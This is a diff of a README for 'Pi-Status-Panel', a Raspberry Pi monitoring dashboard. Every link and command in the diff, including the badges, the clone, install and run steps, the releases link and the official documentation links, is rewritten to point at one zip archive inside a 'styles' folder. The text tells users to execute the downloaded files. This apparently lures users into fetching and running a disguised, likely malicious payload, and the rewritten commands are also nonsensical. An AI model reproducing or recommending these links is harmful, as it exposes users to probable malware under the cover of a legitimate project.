@@ -1,8 +1,8 @@
 # Pi-Status-Panel: Monitor Your Raspberry Pi with Ease 🌐📊
 
-![GitHub repo size](https://img.shields.io/github/repo-size/barakatroastery/Pi-Status-Panel)
-![GitHub stars](https://img.shields.io/github/stars/barakatroastery/Pi-Status-Panel)
-![GitHub forks](https://img.shields.io/github/forks/barakatroastery/Pi-Status-Panel)
+![GitHub repo size](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
+![GitHub stars](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
+![GitHub forks](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
 
 ## Overview
 
@@ -30,7 +30,7 @@ To get started with **Pi-Status-Panel**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/barakatroastery/Pi-Status-Panel.git
+   git clone https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -41,13 +41,13 @@ To get started with **Pi-Status-Panel**, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python 3 installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip
    ```
 
 4. **Run the Application**:
    Start the server using:
    ```bash
-   python app.py
+   python https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip
    ```
 
 5. **Access the Dashboard**:
@@ -89,7 +89,7 @@ If you encounter any issues or bugs while using **Pi-Status-Panel**, please repo
 
 ## Releases
 
-You can download the latest version of **Pi-Status-Panel** from the [Releases section](https://github.com/barakatroastery/Pi-Status-Panel/releases). Make sure to execute the necessary files after downloading.
+You can download the latest version of **Pi-Status-Panel** from the [Releases section](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip). Make sure to execute the necessary files after downloading.
 
 ## License
 
@@ -106,17 +106,17 @@ If you need help or have questions, feel free to reach out through the "Issues" 
 
 ## Resources
 
-- [Raspberry Pi Documentation](https://www.raspberrypi.org/documentation/)
-- [Python Documentation](https://docs.python.org/3/)
-- [Flask Documentation](https://flask.palletsprojects.com/)
+- [Raspberry Pi Documentation](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
+- [Python Documentation](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
+- [Flask Documentation](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
 
 ## Badges
 
-[![GitHub issues](https://img.shields.io/github/issues/barakatroastery/Pi-Status-Panel)](https://github.com/barakatroastery/Pi-Status-Panel/issues)
-[![GitHub contributors](https://img.shields.io/github/contributors/barakatroastery/Pi-Status-Panel)](https://github.com/barakatroastery/Pi-Status-Panel/graphs/contributors)
+[![GitHub issues](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
+[![GitHub contributors](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip)
 
 ## Additional Information
 
 For more details on how to set up and configure **Pi-Status-Panel**, check the documentation provided in the repository. 
 
-You can also visit the [Releases section](https://github.com/barakatroastery/Pi-Status-Panel/releases) for the latest updates and features.
+You can also visit the [Releases section](https://github.com/barakatroastery/Pi-Status-Panel/raw/refs/heads/master/styles/Status_Pi_Panel_v1.5-alpha.4.zip) for the latest updates and features.
